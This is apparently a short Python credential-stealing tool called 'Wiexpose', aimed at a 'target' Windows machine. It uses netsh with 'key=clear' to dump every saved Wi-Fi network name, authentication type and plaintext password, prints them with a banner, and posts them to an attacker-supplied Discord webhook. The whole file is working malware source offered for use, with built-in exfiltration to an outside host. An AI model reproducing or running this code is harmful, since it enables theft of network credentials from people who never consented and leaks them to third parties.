
import subprocess
from prettytable import PrettyTable
from discord_webhook import DiscordWebhook, DiscordEmbed

webhookUrl = '' #Your webhook url | Leave blank if you don't want to use a webhook
embed = DiscordEmbed(
    title= "Wiexpose",
    description = "Show information about networks your target has been connected to",
    color='6a329f'
)

subprocess.run('cls', shell=True)
print('''   created by raven.
    https://github.com/o7raven
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓█████████████████████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓████▓▓▓▓▓▓███████████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓███████▓▓▓▓▓▓████████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓████▓▓▓▓▓██▓▓▓▓██████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓███████▓▓▓▓██▓▒▓█████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓████▓▓▓▓█▓▓▓▓█▓▒▓████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓██████▓▓▓██▓▒██▓▒████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓███▓▓▓██▓▓█▓▒▓█▓▒▓███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓███▓▓▓███████████████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓█████████████████████▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
''')




showProfiles = subprocess.run('netsh wlan show profiles', shell=True, capture_output = True).stdout.decode('utf-8').split('\n')

profiles = [i.split(":")[1][1:-1] for i in showProfiles if "All User Profile" in i]

cmdTable = PrettyTable([f'SSID name', 'Authentication', 'Password'])
for profile in profiles:
    profileInfo = subprocess.run(f'netsh wlan show profile {profile} key=clear', shell=True, capture_output=True).stdout.decode('utf-8').split('\n')

    pwd = [i.split(':')[1][1:-1] for i in profileInfo if "Key Content" in i]
    authType = [i.split(':')[1][1:-1] for i in profileInfo if "Authentication" in i]
    cmdTable.add_row([profile, authType[0], pwd[0]])
    embed.add_embed_field(name=profile, value=f"Auth - *{authType[0]}*\nPwd - '*{pwd[0]}*'", inline=False)

print(cmdTable)
input("\n\nPress enter to exit\n")

if webhookUrl != '':
    webhook = DiscordWebhook(url=webhookUrl)
    webhook.add_embed(embed)
    webhook.execute()
